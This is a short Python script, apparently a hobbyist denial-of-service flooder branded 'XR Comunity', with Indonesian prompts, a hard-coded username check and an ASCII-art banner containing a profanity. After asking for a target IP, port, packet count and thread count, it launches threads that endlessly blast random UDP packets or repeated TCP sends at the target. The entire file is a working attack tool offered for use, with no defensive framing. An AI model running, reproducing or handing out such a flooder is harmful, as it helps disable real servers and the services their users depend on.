username ='lol'
import random
import socket
import threading
import os,sys
import time

os.system("clear")

for i in range(3):
    urm = input("[•] Username: ")
    j=3
    if(urm==username):
        time.sleep(5)
        print("[+] Tunggu Sedang Di Check")
        break
    else:
        time.sleep(5)
        print("[×] Salah Username!!! ")
        continue
time.sleep(5)
print("[@] Username Berhasil")
time.sleep(5)

print("\033[92m")
print("""
    Tools by : XR Comunity

███████╗██╗░░░██╗░█████╗░██╗░░██╗
██╔════╝██║░░░██║██╔══██╗██║░██╔╝
█████╗░░██║░░░██║██║░░╚═╝█████═╝░
██╔══╝░░██║░░░██║██║░░██╗██╔═██╗░
██║░░░░░╚██████╔╝╚█████╔╝██║░╚██╗
╚═╝░░░░░░╚═════╝░░╚════╝░╚═╝░░╚═╝

██╗░░░██╗░█████╗░██╗░░░██╗
╚██╗░██╔╝██╔══██╗██║░░░██║
░╚████╔╝░██║░░██║██║░░░██║
░░╚██╔╝░░██║░░██║██║░░░██║
░░░██║░░░╚█████╔╝╚██████╔╝
░░░╚═╝░░░░╚════╝░░╚═════╝░
""")
print("\033[97m")
ip= str(input(" ip :"))
port= int(input(" port :"))
choice = str(input(" Ddos Attack?? (y/n):"))
times= int(input(" Paket :"))
threads= int(input(" threads :"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[-]","[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" XR COMUNITY ATTACK!!!")
		except:
			print("[!] SERVER DOWN!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[-]","[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" XR COMUNITY ATTACK!!!")
		except:
			s.close()
			print("[*] SERVER DOWN")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()